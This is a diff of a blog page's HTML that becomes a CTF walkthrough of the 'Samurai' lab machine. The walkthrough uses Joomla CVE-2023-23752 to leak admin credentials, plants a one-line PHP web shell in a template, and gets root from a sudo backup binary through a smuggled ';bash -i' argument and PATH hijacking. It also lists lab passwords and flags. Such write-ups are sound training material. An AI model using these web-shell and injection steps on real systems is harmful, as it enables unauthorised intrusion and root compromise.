@@ -3,22 +3,22 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Command-Injection | Null Blog</title>
-<meta property="og:title" content="Command-Injection | Null Blog" />
-<meta name="twitter:title" content="Command-Injection | Null Blog" />
-<meta itemprop="name" content="Command-Injection | Null Blog" />
-<meta name="application-name" content="Command-Injection | Null Blog" />
+<title itemprop="name">Samurai - Walkthrough | Null Blog</title>
+<meta property="og:title" content="Samurai - Walkthrough | Null Blog" />
+<meta name="twitter:title" content="Samurai - Walkthrough | Null Blog" />
+<meta itemprop="name" content="Samurai - Walkthrough | Null Blog" />
+<meta name="application-name" content="Samurai - Walkthrough | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the Samurai machine.">
+<meta itemprop="description" content="Walkthrough for the Samurai machine." />
+<meta property="og:description" content="Walkthrough for the Samurai machine." />
+<meta name="twitter:description" content="Walkthrough for the Samurai machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/command-injection/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/hsm/samurai/" title="" />
 
 
 
@@ -28,26 +28,33 @@
 <meta name="generator" content="Hugo 0.162.1">
 
     
-    <meta property="og:url" content="https://nvru.github.io/tags/command-injection/">
+    <meta property="og:url" content="https://nvru.github.io/walkthrough/hsm/samurai/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Command-Injection">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="Samurai - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the Samurai machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="walkthrough">
+		<meta property="article:published_time" content="2026-07-25T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-25T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Apache">
+		<meta property="article:tag" content="Joomla">
+		<meta property="article:tag" content="Cve-2023-23752">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Command-Injection">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="Samurai - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the Samurai machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/tags/command-injection/">
-    <link href="/tags/command-injection/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
-    <link href="/tags/command-injection/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
+    <link rel="canonical" href="https://nvru.github.io/walkthrough/hsm/samurai/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -109,7 +116,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/walkthrough/">
+                    <a class="menu-link active" href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -165,87 +172,228 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Command-Injection</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hsm/samurai/">Samurai - Walkthrough</a>
-    </h4>
+        <article>
+            <header class="header">
+                <h1 class="header-title">Samurai - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-25T00:00:00&#43;00:00" itemprop="datePublished"> 25 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
     
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-25T00:00:00Z">
-        25 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/chronos/">Chronos - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-19T00:00:00Z">
-        19 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer2/">Printer2 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-14T00:00:00Z">
-        14 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/translator/">Translator - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#port-scanning">Port Scanning</a>
+      <ul>
+        <li><a href="#rustscan">RustScan</a></li>
+        <li><a href="#results">Results</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+        <li><a href="#nikto">Nikto</a></li>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+        <li><a href="#cve-2023-23752">CVE-2023-23752</a></li>
+        <li><a href="#administrator-login">Administrator Login</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#www-data--root">www-data → root</a></li>
+        <li><a href="#command-injection">Command Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#credentials">Credentials</a></li>
+    <li><a href="#flags">Flags</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.200.74.40</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.1.22.42</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access by exploiting a vulnerable Joomla installation (CVE-2023-23752), and escalate privileges by abusing a vulnerable backup binary that could be executed as root.</p>
+<p><img src="/images/hsm/samurai/system.png" alt="Machine Information"></p>
+<hr>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="rustscan">RustScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.1.22.42 -- -sC -sV -A -oN nmap/rust
+</span></span></code></pre></div><h3 id="results">Results</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
+</span></span></code></pre></div><p>Only two services were exposed:</p>
+<ul>
+<li>SSH on port <strong>22</strong></li>
+<li>Apache HTTP Server on port <strong>80</strong></li>
+</ul>
+<p>Since SSH generally requires valid credentials, the web service became the primary attack surface.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Browsing to the web server displayed a simple page about Samurai swords.</p>
+<p><img src="/images/hsm/samurai/http.png" alt="HTTP"></p>
+<p>Checking the page source did not reveal anything interesting, so I continued with automated enumeration.</p>
+<hr>
+<h3 id="nikto">Nikto</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nikto -h http://10.1.22.42/
+</span></span></code></pre></div><p>Nikto reported a few missing security headers and that the Apache version appeared outdated, but nothing immediately exploitable.</p>
+<p>The scan did not reveal hidden files or vulnerable CGI scripts, so I proceeded with directory enumeration.</p>
+<hr>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>Using a directory brute-force tool revealed two interesting files:</p>
+<ul>
+<li><code>LICENSE.txt</code></li>
+<li><code>README.txt</code></li>
+</ul>
+<p><img src="/images/hsm/samurai/dir_brute.png" alt="Directory Enumeration"></p>
+<p>Opening the files showed they belonged to a Joomla installation.</p>
+<p><img src="/images/hsm/samurai/license.png" alt="License"></p>
+<p><img src="/images/hsm/samurai/readme.png" alt="README"></p>
+<p>The README identified the CMS as <strong>Joomla 4.2.x</strong>.</p>
+<p><img src="/images/hsm/samurai/joomla_version.png" alt="Joomla Version"></p>
+<hr>
+<h3 id="cve-2023-23752">CVE-2023-23752</h3>
+<p>After identifying the Joomla version, I searched for known vulnerabilities affecting it.</p>
+<p>I found <strong>CVE-2023-23752</strong>, an unauthenticated information disclosure vulnerability affecting Joomla 4.0.0 through 4.2.7.</p>
+<p>Reference:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</a></li>
+</ul>
+<p>Running the exploit successfully leaked sensitive configuration data.</p>
+<p><img src="/images/hsm/samurai/exploit.png" alt="Exploit"></p>
+<p>The response exposed the database configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DB type: mysqli
+</span></span><span style="display:flex;"><span>DB host: localhost
+</span></span><span style="display:flex;"><span>DB user: joomla425
+</span></span><span style="display:flex;"><span>DB password: Pa847word987@Joomla456
+</span></span><span style="display:flex;"><span>DB name: Dbjoomla
+</span></span><span style="display:flex;"><span>DB prefix: iemj4_
+</span></span></code></pre></div><p>It also revealed the Joomla administrator username:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Miyamoto
+</span></span></code></pre></div><hr>
+<h3 id="administrator-login">Administrator Login</h3>
+<p>During directory enumeration I had also discovered the administrator panel.</p>
+<pre tabindex="0"><code>http://10.1.22.42/administrator
+</code></pre><p>The login page was accessible.</p>
+<p><img src="/images/hsm/samurai/login_page.png" alt="Login Page"></p>
+<p>Using the leaked credentials successfully authenticated to the Joomla administrator dashboard.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: Miyamoto
+</span></span><span style="display:flex;"><span>Password: Pa847word987@Joomla456
+</span></span></code></pre></div><hr>
+<h2 id="initial-access">Initial Access</h2>
+<p>With administrator access, uploading a web shell was straightforward.</p>
+<p>Navigate to:</p>
+<pre tabindex="0"><code>System
+    → Site Templates
+</code></pre><p><img src="/images/hsm/samurai/system.png" alt="System"></p>
+<p><img src="/images/hsm/samurai/site_templates.png" alt="Site Templates"></p>
+<p>Only one template was present.</p>
+<p><img src="/images/hsm/samurai/template.png" alt="Template"></p>
+<p>Instead of modifying <code>index.php</code>, I edited another template file to avoid breaking the main page.</p>
+<p>The following PHP payload was inserted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span><span style="color:#e6db74">`$_GET[0]`</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img src="/images/hsm/samurai/template_src.png" alt="Template Source"></p>
+<p>After saving the template, arbitrary commands could be executed through the browser.</p>
+<p><img src="/images/hsm/samurai/id_suc.png" alt="id www-data"></p>
+<p>Using the web shell, I spawned a reverse shell.</p>
+<p><img src="/images/hsm/samurai/rev_shell.png" alt="Reverse Shell"></p>
+<p>Once connected, I upgraded the shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script -q /dev/null
+</span></span><span style="display:flex;"><span>bash -i
+</span></span></code></pre></div><p>Background the shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CTRL + Z
+</span></span></code></pre></div><p>Then fix the terminal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty raw -echo; fg
+</span></span></code></pre></div><p>Press <strong>Enter</strong> twice.</p>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="www-data--root">www-data → root</h3>
+<p>The first thing I checked was the sudo permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img src="/images/hsm/samurai/sudo_perm.png" alt="Sudo Permissions"></p>
+<p>The output showed that <code>www-data</code> could execute the following binary as root without supplying a password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/opt/backup/DbMaria
+</span></span></code></pre></div><p>The binary itself had the SUID bit set.</p>
+<p><img src="/images/hsm/samurai/file_perm.png" alt="File Permissions"></p>
+<p>Checking its properties showed that it was <strong>not stripped</strong>, making it easier to inspect.</p>
+<p><img src="/images/hsm/samurai/not_stripped.png" alt="Not Stripped"></p>
+<p>Running <code>strings</code> against the binary revealed several interesting functions, including <code>setuid()</code> and <code>system()</code>.</p>
+<p><img src="/images/hsm/samurai/strings.png" alt="Strings"></p>
+<p>Among the extracted strings was the command executed by the program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s &gt; /tmp/backup.sql
+</span></span></code></pre></div><p>Notice that the database name supplied by the user is inserted directly into the command without sanitization.</p>
+<p>This makes the binary vulnerable to <strong>command injection</strong>.</p>
+<hr>
+<h3 id="command-injection">Command Injection</h3>
+<p>Inspecting the binary with <code>strings</code> revealed the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s &gt; /tmp/backup.sql
+</span></span></code></pre></div><p>The database name provided by the user is inserted directly into the command without any sanitization before being passed to <code>system()</code>. This makes the binary vulnerable to command injection.</p>
+<p>There are two different ways to abuse this binary.</p>
+<h4 id="method-1---injecting-commands">Method 1 - Injecting Commands</h4>
+<p>The easiest method is to inject a command into the database name. Since the input is passed directly to the shell, a semicolon (<code>;</code>) can be used to terminate the original <code>mariadb-dump</code> command and execute a new one.</p>
+<p>For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/backup/DbMaria <span style="color:#e6db74">&#39;;bash -i&#39;</span>
+</span></span></code></pre></div><p>or</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/backup/DbMaria <span style="color:#e6db74">&#39;;bash -i;&#39;</span>
+</span></span></code></pre></div><p>The database dump will fail, but the injected <code>bash -i</code> command is executed as <strong>root</strong>, giving an interactive root shell.</p>
+<p>There is actually no need for the trailing semicolon after <code>bash -i</code>; I simply used it out of habit. The exploit works either way.</p>
+<p><img src="/images/hsm/samurai/sudo_first.png" alt="First Sudo Method"></p>
+<hr>
+<h4 id="method-2---path-hijacking">Method 2 - PATH Hijacking</h4>
+<p>Another interesting observation is that the binary executes <code>mariadb-dump</code> without using its absolute path.</p>
+<p>Because of that, it is possible to hijack the <code>PATH</code> variable and force the binary to execute our own malicious program instead.</p>
+<p>First, create a fake <code>mariadb-dump</code> executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i&#39;</span> &gt; /tmp/mariadb-dump
+</span></span><span style="display:flex;"><span>chmod +x /tmp/mariadb-dump
+</span></span></code></pre></div><p>Then prepend <code>/tmp</code> to the <code>PATH</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span></code></pre></div><p>Finally, execute the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/backup/DbMaria nvru
+</span></span></code></pre></div><p><img src="/images/hsm/samurai/second_way.png" alt="Second Sudo Method"></p>
+<p>This successfully spawns a root shell. If the shell appears without any output, simply restore standard output by running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exec 1&gt;/dev/tty
+</span></span></code></pre></div><p><img src="/images/hsm/samurai/second_fix.png" alt="Second Fix"></p>
+<p>One interesting thing I noticed while testing is that this second method only works when executing the binary directly.</p>
+<p>Initially, I focused on this binary because <code>sudo -l</code> allowed me to run it as root. However, if the binary is executed with <code>sudo</code>, this technique fails because <code>sudo</code> resets the environment and uses its own secure <code>PATH</code>. As a result, the fake <code>mariadb-dump</code> in <code>/tmp</code> is never executed.</p>
+<p><img src="/images/hsm/samurai/sudo_secon.png" alt="Second Sudo Method"></p>
+<p>The first method, however, works perfectly with <code>sudo</code> because it doesn&rsquo;t rely on the environment at all. Instead, it abuses the application&rsquo;s unsanitized input, causing <code>system()</code> to execute the injected command directly as root.</p>
+<hr>
+<h2 id="user-flag">User Flag</h2>
+<p>To locate the user flag, I searched the filesystem.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name user.txt 2&gt;/dev/null
+</span></span></code></pre></div><p><img src="/images/hsm/samurai/found_user_flag.png" alt="User Flag"></p>
+<hr>
+<h2 id="credentials">Credentials</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Miyamoto:Pa847word987@Joomla456
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DB User: joomla425
+</span></span><span style="display:flex;"><span>DB Password: Pa847word987@Joomla456
+</span></span></code></pre></div><hr>
+<h2 id="flags">Flags</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:flag{Tachi_794–1185}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:flag{Katana_1603–1868}
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
